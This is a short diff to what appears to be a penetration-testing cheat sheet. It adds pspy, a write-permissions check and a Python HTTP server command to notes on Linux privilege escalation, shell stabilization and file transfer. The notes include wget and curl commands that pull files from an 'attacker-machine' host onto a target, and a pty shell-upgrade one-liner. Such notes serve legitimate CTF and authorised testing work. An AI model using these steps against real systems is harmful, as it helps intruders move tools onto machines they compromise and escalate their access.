@@ -159,10 +159,12 @@
 - lspci -t -v
 - Groups: LXD????
 - crontab
+- Write permisions?
 - Automatic tools
   - LinEnum.sh 
   - LinPeas
   - psexec.py
+  - pspy
   
 - Shell stabilize
   - python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -242,6 +244,7 @@
   - [Other info](https://www.coresecurity.com/core-labs/open-source-tools/impacket)
   
 ### Linux
+- python3 -m http.server 8000
 - wget attacker-machine:8000:file.ext
 - curl attacker-machine:8000:file.ext
 
